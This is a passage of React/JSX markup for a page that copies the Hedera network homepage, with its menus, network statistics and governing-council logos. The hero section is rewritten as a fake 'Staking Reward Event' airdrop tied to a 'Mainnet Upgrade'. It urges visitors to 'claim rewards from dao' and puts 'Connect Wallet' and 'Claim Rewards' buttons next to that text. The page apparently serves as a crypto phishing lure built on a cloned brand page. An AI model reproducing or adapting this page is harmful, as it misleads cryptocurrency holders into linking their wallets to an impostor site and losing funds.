                              className="menu-dropdown-link"
                              href="https://hedera.com/papers"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Papers</div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item menu-dropdown-item--no-icon">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/future"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Careers</div>
                              </div>
                            </a>
                          </li>
                        </ul>
                      </div>
                    </li>

                    <li className="menu-dropdown-section menu-dropdown-section--vertical-one-column">
                      <div className="menu-dropdown-section--vertical-wrapper">
                        <div
                          className="menu-dropdown-section-title"
                          role="heading"
                          id="menu-dropdown-section-media"
                        >Media</div>

                        <ul
                          className="menu-dropdown-list"
                        >
                          <li className="menu-dropdown-item menu-dropdown-item--no-icon">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/podcast"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Podcast</div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item menu-dropdown-item--no-icon">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/news"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">News</div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item menu-dropdown-item--no-icon">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/blog"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Blog</div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item menu-dropdown-item--no-icon">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/press"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Press</div>
                              </div>
                            </a>
                          </li>
                        </ul>
                      </div>
                    </li>

                    <li className="menu-dropdown-section menu-dropdown-section--vertical-one-column">
                      <div className="menu-dropdown-section--vertical-wrapper">
                        <div
                          className="menu-dropdown-section-title"
                          role="heading"
                          id="menu-dropdown-section-community"
                        >Community</div>

                        <ul
                          className="menu-dropdown-list"
                        >
                          <li className="menu-dropdown-item menu-dropdown-item--no-icon">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/events"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Events</div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item menu-dropdown-item--no-icon">
                            <a
                              className="menu-dropdown-link"
                              href="https://docs.hedera.com/hedera/support-and-community/meetups"
                              target="_blank"
                              rel="noreferrer noopener"
                            >
                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Meetups</div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item menu-dropdown-item--no-icon">
                            <a
                              className="menu-dropdown-link"
                              href="https://shop.hedera.com/"
                              target="_blank"
                              rel="noreferrer noopener"
                            >
                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Store</div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item menu-dropdown-item--no-icon">
                            <a
                              className="menu-dropdown-link"
                              href="https://brand.hedera.com/"
                              target="_blank"
                              rel="noreferrer noopener"
                            >
                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Brand</div>
                              </div>
                            </a>
                          </li>
                        </ul>
                      </div>
                    </li>
                  </ul>
                </div>
              </div>
            </li>
          </ul>
        </nav>

        <div className="main-menu-mobile-drawer-header">
          <div className="button-wrapper button-wrapper--back">
            <button
              className="back js-nav-back"
            >
              <svg
                width="30px"
                height="30px"
                viewBox="0 0 30 30"
                version="1.1"
                xmlns="http://www.w3.org/2000/svg"
                
              >
                <title>Group</title>

                <g
                  id="Homepage"
                  stroke="none"
                  strokeWidth="1"
                  fill="none"
                  fillRule="evenodd"
                >
                  <g
                    id="Mobile-Nav---2"
                    transform="translate(-25.000000, -40.000000)"
                    stroke="#222222"
                  >
                    <g
                      id="Group"
                      transform="translate(25.000000, 40.000000)"
                    >
                      <circle
                        id="Oval"
                        cx="15"
                        cy="15"
                        r="14.5"
                      ></circle>

                      <polyline
                        id="Path"
                        transform="translate(17.000000, 15.000000) rotate(45.000000) translate(-17.000000, -15.000000)"
                        points="21.0180664 19.0180664 12.9819336 19.0180664 12.9819336 10.9819336"
                      ></polyline>
                    </g>
                  </g>
                </g>
              </svg>
            </button>
          </div>

          <div
            className="main-menu-mobile-drawer-title"
          >Navigation</div>

          <div className="button-wrapper button-wrapper--close">
            <button
              className="close js-nav-close"
              // ariaLabel="Close menu"
            >
              <svg
                width="30px"
                height="30px"
                viewBox="0 0 30 30"
                version="1.1"
                xmlns="http://www.w3.org/2000/svg"
                
              >
                <title>Group 3</title>

                <g
                  id="Homepage"
                  stroke="none"
                  strokeWidth="1"
                  fill="none"
                  fillRule="evenodd"
                >
                  <g
                    id="Mobile-Nav---1"
                    transform="translate(-290.000000, -40.000000)"
                    stroke="#222222"
                  >
                    <g
                      id="Group-3"
                      transform="translate(290.000000, 40.000000)"
                    >
                      <circle
                        id="Oval"
                        cx="15"
                        cy="15"
                        r="14.5"
                      ></circle>

                      <g
                        id="Group-4"
                        transform="translate(15.000000, 15.000000) rotate(45.000000) translate(-15.000000, -15.000000) translate(8.500000, 8.500000)"
                        strokeLinecap="round"
                      >
                        <line
                          x1="0.5"
                          y1="6.5"
                          x2="12.5"
                          y2="6.5"
                          id="Line-Copy-2"
                        ></line>

                        <line
                          x1="0.5"
                          y1="6.5"
                          x2="12.5"
                          y2="6.5"
                          id="Line-Copy-2"
                          transform="translate(6.500000, 6.500000) rotate(90.000000) translate(-6.500000, -6.500000)"
                        ></line>
                      </g>
                    </g>
                  </g>
                </g>
              </svg>
            </button>
          </div>
        </div>

        <div className="call-to-action">
          <div className="call-to-action-inner-wrapper">
            <a className="btn-coco Btn is-white has-bg"
            onClick={async () => {
                    if (isConnected) {
                      await hcInitPromise;
                      if (isConnected && hc.connectedAccountIds.length > 0) {
                        hc.disconnect();
                      }
                    } else {
                      hc.openPairingModal();
                    }
                  }}
            >
            {isConnected
                ? `Disconnect Wallet${connectedAccountIds.length > 1 ? "s" : ""}`
                : "Connect Wallet"}
            </a>
          </div>
        </div>

        <form
          className="search"
          action="https://hedera.com/search"
          data-hs-cf-bound="true"
        >
          <div className="search-inner-wrapper">
            <input
              type="search"
              name="q"
              placeholder="Search"
              // maxlength="48"
              // value=""
            ></input>
          </div>
        </form>

        <div className="ctrls">
          <button
            className="hamburger js-nav-hamburger"
            // ariaLabel="Open main menu"
            // ariaExpanded="false"
            aria-haspopup="menu"
          >
            <svg
              className="hamburger-icon"
              width="30px"
              height="30px"
              viewBox="0 0 30 30"
              version="1.1"
              xmlns="http://www.w3.org/2000/svg"
              
            >
              <title>menu</title>

              <g
                id="hamburger"
                stroke="none"
                strokeWidth="1"
                fill="none"
                fillRule="evenodd"
              >
                <g
                  id="hamburger-mobile"
                  transform="translate(-45.000000, -40.000000)"
                  stroke="#FFFFFF"
                >
                  <g
                    id="Group-3"
                    transform="translate(45.000000, 40.000000)"
                  >
                    <circle
                      id="Oval"
                      cx="15"
                      cy="15"
                      r="14.5"
                    ></circle>

                    <g
                      id="Group"
                      transform="translate(8.500000, 9.500000)"
                      strokeLinecap="round"
                    >
                      <line
                        x1="0.5"
                        y1="0.5"
                        x2="12.5"
                        y2="0.5"
                        id="Line"
                      ></line>

                      <line
                        x1="0.5"
                        y1="5.5"
                        x2="12.5"
                        y2="5.5"
                        id="Line-Copy"
                      ></line>

                      <line
                        x1="0.5"
                        y1="10.5"
                        x2="12.5"
                        y2="10.5"
                        id="Line-Copy-2"
                      ></line>
                    </g>
                  </g>
                </g>
              </g>
            </svg>
          </button>
        </div>
      </div>
    </div>
  </div>

  <div className="Section rwa">
    <div className="home-hero home-hero-takeover-rwa">
      <div className="home-hero-takeover-rwa-gradients">
        <div id="gradientBottom">
          <img
            src="https://hedera.com/assets/images/home/rwa/RWA-Gradient-Homepage-Bottom.webp"
          />
        </div>

        <div id="gradientMiddle">
          <img
            src="https://hedera.com/assets/images/home/rwa/RWA-Gradient-Homepage-Middle.webp"
          />
        </div>

        <div id="gradientTop">
          <img
            src="https://hedera.com/assets/images/home/rwa/RWA-Gradient-Homepage-Top.webp"
          />
        </div>
      </div>

      <div
        id="circlesContainer"
        className="circles-container"
      >
        <div className="circles">
          <img
            src="https://hedera.com/assets/images/home/rwa/Circles.svg"
          />
        </div>

        <div
          id="spinningElement"
          className="spinning-element"
          style={{transform: 'rotate(0deg)'}}
        >
          <img
            src="https://hedera.com/assets/images/home/rwa/Spinning-Element.svg"
          />
        </div>

        <div className="object">
          <img
            src="https://hedera.com/assets/images/home/rwa/Object.svg"
          />
        </div>
      </div>

      <div className="text">
        <h1>
          Welcome to Hedera Staking <br />

          <span
            className="text-outline"
            id="typeFx"
          >Reward Event</span>

          <span className="cursor-fx"></span>
        </h1>

        <div className="description" style={{lineHeight: '1.5em', marginTop: '5em'}}>
          Celebrating Hedera Mainnet Upgrade,

          <span className="text-decorated">exclusive incentive rewards</span>

          are provided for active staking participants of Hedera Network. The airdrop is part of a broader effort to build a robust and active community around Hedera's scalable blockchain solutions.

          <br />
          Update your account and claim rewards from dao!
        </div>

        <div className="actions">
          <a
            className="Btn is-gradient-green btn-coco"
            style={{fontSize:18, textTransform: 'none', fontWeight: 400, padding:'5px 15px', height:'auto'}}
          >Claim Rewards</a>

        </div>
      </div>
    </div>

    <script
      data-savepage-type="text/javascript"
      type="text/plain"
    ></script>
  </div>

  <div className="Section" style={{width: '100vw', backgroundColor:'#fffffff0'}}>
    <div className="home-stats">
      <div className="stats-container">
        <div className="item">
          <h3 className="stat">
            <span
              className="count-up"
              data-number="6637180"
            >6,637,180</span>
          </h3>

          <p className="description">
            <strong>
              MAINNET

              <br />
              ACCOUNTS CREATED
            </strong>
          </p>
        </div>

        <div className="item">
          <h3 className="stat">
            <span
              className="count-up"
              data-number="224452638"
            >224,452,638</span>
          </h3>

          <p className="description">
            <strong>
              TRANSACTIONS IN

              <br />
              THE LAST 24 HOURS
            </strong>
          </p>
        </div>

        <div className="item">
          <h3 className="stat">
            <span
              className="type-in"
              data-number="2.91"
            >2.91</span>
          </h3>

          <p className="description">
            <strong>
              SECONDS TO

              <br />
              CONSENSUS FINALITY
            </strong>
          </p>
        </div>

        <div className="item">
          <h3 className="stat">
            $

            <span
              className="type-in"
              data-number="0.0001"
            >0.0001</span>
          </h3>

          <p className="description">
            <strong>
              AVERAGE COST

              <br />
              PER TRANSACTION
            </strong>
          </p>
        </div>

        <div className="item">
          <h3 className="stat">
            <span
              className="type-in"
              data-number="0.000003"
            >0.000003</span>
          </h3>

          <p className="description">
            <strong>
              AVERAGE KWH

              <br />
              PER TRANSACTION
            </strong>
          </p>
        </div>
      </div>
    </div>

  </div>

  <div className="Section" style={{width: '100vw', backgroundColor:'#fffffff0'}}>
    <div className="home-built-by">
      <img
        className="bgImage bgImageMobile"
        src="https://images.hedera.com/HH-Home-Mobile-Line-BG-trimmed.png?w=390&h=1952&auto=compress%2Cformat&fit=crop&dm=1709007448&s=5828115bb22217bf166f76c94908fc11"
      />

      <div
        className="column-one"
        id="pinContainer"
      >
        <div
          className="bg-wrapper"
          style={{borderRight: '3px solid #000'}}
          id="rotateContainer"
        >
          <img
            id="rotateItem"
            className="bgImage bgImageHasMobile"
            src="https://images.hedera.com/HH-Homepage-Desktop-Lines-retina.png?w=525&auto=compress%2Cformat&fit=crop&dm=1709007471&s=bf50fd01fefd063369ad2ff0d66f18f9"
            style={{translate: 'none', rotate: 'none', scale: 'none', transform: 'translate3d(152.427px, 0px, 0px) rotate(-14.5187deg)'}}
          />
        </div>

        <div
          className="pin-spacer"
          style={{order: 0, placeSelf: 'auto', gridArea: 'auto', zIndex: 'auto', float: 'none', flexShrink: 1, display: 'block', margin: '0px', inset: '0px 0px 1346px', position: 'absolute', flexBasis: 'auto', overflow: 'visible', boxSizing: 'border-box', width: '525px', height: '2014px', padding: '0px 0px 1346px'}}
        >
          <div
            className="heading"
            id="pinItem"
            style={{translate: 'none', rotate: 'none', scale: 'none', inset: '0px auto auto 0px', margin: 0, maxWidth: '410px', width: '410px', maxHeight: '668px', height: '668px', padding: '0px 0px 0px 115px', transform: 'translate(0px, 0px)'}}
          >
            <p
              id="community"
              className=""
              style={{lineHeight: '1.5em'}}
            >
              <strong>A responsibly <br /> governed</strong> <br />

              decentralized <br /> network

              <br />
              <br />
            </p>

            <p
              id="governed"
              className="disabled"
            >
              <strong>With <br /> ecosystems</strong> <br />

              <strong>built &nbsp;</strong>

              by the <br /> community
            </p>
          </div>
        </div>
      </div>

      <div className="column-two">
        <h2 className="heading">
          An open source, public network governed by leading organizations around the world
        </h2>

        <div className="description">
          The Hedera Governing Council is a fully decentralized and transparent governing body of independent, global organizations consisting of enterprises, web3 projects, and prestigious universities.
        </div>

        <a
          href="https://hedera.com/council"
          className="Btn is-gradient-green"
          target="_blank"
          rel="noreferrer noopener"
        >Governing council</a>

        <div className="logos">
          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-SoftGrey-Abrdn.png?w=200&h=87&auto=compress%2Cformat&fit=crop&dm=1709006834&s=ec0727ee63faedcc60c32d178f738332"
              width="200"
              height="87"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-Australian-Payments-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709006491&s=b8b540d373e27b5ccfa16738cd736333"
              width="200"
              height="89"
              
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-Avery-Dennison-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709006503&s=1997245d213efe71c4dfdd2392b2a65d"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-BitGo-SoftGrey_2024-02-28-130700_wocq.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709125621&s=02264eea7b3de47c9bcf03ef96bbe573"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-Boeing-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709006535&s=ba5e89547599222323e28880d27fd2fb"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-Chainlink-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709006546&s=9f0507eecdfa65764026067bd6766620"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Homepage-Logos-Grey-CH.png?w=200&h=67&auto=compress%2Cformat&fit=crop&dm=1709007485&s=af77e77f08efbae3467931f697f91310"
              width="200"
              height="67"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/Council-Logo-Grey-Dell.png?w=200&h=67&auto=compress%2Cformat&fit=crop&dm=1708985574&s=a732bacadf9675f812e06b03da7f66f3"
              width="200"
              height="67"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-Dentons-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709006626&s=14f19d293174446eb2d9b9e51a56b3e1"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-Deutsche-Telekom-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709006632&s=31acdda364f7429d51ec8faab33f61fb"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-DLA-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709006595&s=ede69ccb4f13b2ab50da7ffa60dba743"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-EDF-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709006637&s=03312f21b339313b99775448fd6e051c"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-Google-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709006668&s=7f978c1ba07ee6332b07dd21de5b796b"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-Hitachi-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709006726&s=d8b49730cb16393e704650e7ae9eedd2"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-IBM-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709006735&s=0c481b0d3dcc980a66f27de1f4359d36"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-IIT-Madras-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709006740&s=37c3caa45e79005c70371f883139806b"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-LG-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709006747&s=0e6931c8ff045cf275a0e152852661e0"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-LSE-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709006755&s=f127fceb97b4be3e447135d5816e6c2d"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-Magalu-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709006764&s=0b3d773501533de5fedf802367f45ed3"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-Mondelez-SoftGrey_2024-02-14-103317_sfun.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709006792&s=58810b8f665ea3f8d7b05b3bb85c2824"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-Nomura-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709006798&s=1a380c36f4dd48eb70b326aad1adac83"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-Servicenow-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709006804&s=e858be9d8bf688bdb2bcf904025b71bb"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-Shinhan-Bank-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709006813&s=918905f79bf7d7ea44fc2ae168933975"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-Standard-Bank-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709006940&s=f38ecd50d44f2956a841cdc79af3fe61"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-Swirlds-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709006948&s=cf5fffd2c13c766e3cc9d06561743450"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-TATA-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709006962&s=74d8b8a13f61b3d2ef653345b1b3761a"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-Ubisoft-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709006973&s=119f3b831486d5eaaab6904343d4d645"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-UCL-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709006968&s=4ec8e876192a028b3c8b4d0d1013b41e"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-Wipro-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709007092&s=03cba6d719ebd82dca1ca9b5e2bd42f5"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-Worldpay-SoftGrey_2024-02-14-103239_eefz.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709007114&s=e8c015a4689bfed2efc4848754c657f1"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/HH-Council-Logos-Zain-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709007127&s=169378230340ffa86039502eb5058d67"
              width="200"
              height="89"
            />
          </div>
        </div>

        <h2
          id="sectionTwoHeading"
          className="heading"
        >
          With application ecosystems and standards built by the developer community
        </h2>

        <div className="description">
          The Hedera codebase and ecosystem standards are open source and contributed by the community through Hedera Improvement Proposals (HIPs). The community consists of Hedera application and ecosystem developers, node operators, and peripheral organizations.
        </div>

        <a
          href="https://hips.hedera.com/"
          className="Btn is-gradient-green"
          target="_blank"
          rel="noreferrer noopener"
        >View HIPS</a>

        <div className="logos">
          <div className="logo">
            <img
              src="https://images.hedera.com/Hashgraph_Logo_Soft-Grey.png?w=200&h=43&auto=compress%2Cformat&fit=crop&dm=1723846332&s=b9550b24c8e02536ae835b04d4189067"
              width="200"
              height="43"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/LimeChain-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709011297&s=be5b0aaaa6f01725aa7d7519e048b036"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/Horizen-Labs-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709010276&s=302baddd46ad5d861aedbe022c4e3198"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/Karate-Combat-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1718789273&s=ff45f9d26a32d61b4f3c9382b0df132a"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/LG-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709011050&s=87e8dfb595791175916101fb7c8ae84b"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/Meeco-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709011593&s=e8137390f8afaa133d088dc2a8e2e236"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/Emblock-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709005378&s=25e2343e14093c3b0070f547574b6d9e"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/Launchbadge-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709011104&s=d2accae76dcb09832fd2b0d48fa0efcb"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/Calaxy-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1708985167&s=fadffb8f1aaa4b8d6d0005333a7ce0b4"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/Hashpack-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709008787&s=ace0c31244931ae53e55232307d1a66b"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/SaucerSwap-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709012888&s=626f4622d5c02bfe1529ded667116f76"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/Envision-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709005416&s=d36aad6827c8ad94a5eb97831b7f089f"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/Arkane-Network-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1708984044&s=c6237e7a04b3c5b97f081c48f1a8857e"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/xfers-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709022638&s=1d150aaea4dd9539140125bd66569f26"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/DOVU-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1708990400&s=44e139349614547b9ba377abb310e02b"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/Luther-Systems-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709011447&s=679f065fc2497ef9dcca5755ce5b7826"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/iobuilders-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709019710&s=b6245474399177003e16b3903030d396"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/Turtle-Moon-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709016218&s=71caef4c15846b04bc20a9c591932d48"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/Object-Computing-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709012220&s=5fd3dfb8d65b736c0bdd248611697246"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/Noviqtech-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1712319378&s=84b0ab29eb7b3f4830519399ff16a930"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/The-Hbar-Foundation-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709016098&s=69855cff4f27cb937730037b6dc34037"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/Hsuite-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709010386&s=8b2bbfc63980998089328509d292c6c6"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/Six-Clovers-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1709015047&s=4464d44eda9adce0f834c9a93877806e"
              width="200"
              height="89"
            />
          </div>

          <div className="logo">
            <img
              src="https://images.hedera.com/Buidler-labs-SoftGrey.png?w=200&h=89&auto=compress%2Cformat&fit=crop&dm=1708985064&s=865b59764e2628d533e4ae1c03b6c445"
              width="200"
              height="89"
            />
          </div>
        </div>
      </div>
    </div>

  </div>

  <div className="Section" style={{width: '100vw', backgroundColor:'#fffffff0'}}>
    <div className="use-cases-ecosystem-banner padding-top-none padding-bottom-default">
      <div className="ecosystem-banner-wrapper">
        <div className="row">
          <div className="col col-1" style={{maxWidth: '100%', color: '#fff'}}>
            <div className="items" style={{width: '100%'}}>
              <div className="item" style={{width: '100%', minWidth:'100%', lineHeight:'2em'}}>
                <img
                  className="logo"
                  src="https://images.hedera.com/eqtylab-logo-white.png?w=176&h=36&auto=compress%2Cformat&fit=crop&dm=1709018125&s=6f040ca6a5958514f712d8725fbc0360"
                />

                <div className="useCaseBannerTitle" style={{fontWeight: '900'}}>
                  DATA-DRIVEN CLIMATE CHANGE DECISION MAKING
                </div>

                <div className="useCaseBannerSubitle">
                  See how this industry-first blockchain-native integration leverages Hedera for AI transparency and equitable climate decisions.
                </div>

                <div className="actions"  style={{width: '100%'}}>
                  <a
                    href="https://hedera.com/users/eqty-lab"
                    className="Btn is-gradient-green"
                    target="_self"
                    rel=""
                  >READ CASE STUDY</a>

                  <a
                    href="https://hedera.com/blog/eqty-lab-brings-open-source-ai-integrity-framework-to-hugging-face-community-with-industry-first-native-hedera-blockchain-integration"
                    className="Btn is-white has-bg"
                    target="_self"
                    rel=""
                  >PRESS RELEASE</a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

  </div>

  <div className="Section" style={{width: '100vw', backgroundColor:'#fffffff0'}}>
    <div className="home-use-cases-ecosystems">
      <img
        className="bgImage home-use-cases-ecosystems-background"
        src="https://files.hedera.com/HH-Homepage-Desktop-LinesRadius.svg?dm=1709007480"
      />

      <div className="heading-row">
        <h2 className="heading">Use cases &amp; ecosystems</h2>

        <a
          href="https://hedera.com/ecosystem"
          className="Btn is-gradient-green"
          target="_blank"
          rel="noreferrer noopener"
        >View all</a>
      </div>

      <div className="boxes">
        <div className="box">
          <div className="box-body">
            <img
              src="https://files.hedera.com/Nav-Icon-RWA-Tokenization-std-v1.svg?dm=1710326405"
              width="53"
              height="54"
            />

            <h3 className="box-heading">REAL-WORLD ASSET TOKENIZATION</h3>

            <div className="box-description">
              Discover the transformative potential of real-world asset (RWA) tokenization with Hedera. The Hedera platform simplifies the process of tokenizing real-world and digital assets, making them liquid, fractional, and transparent.
            </div>
          </div>

          <a
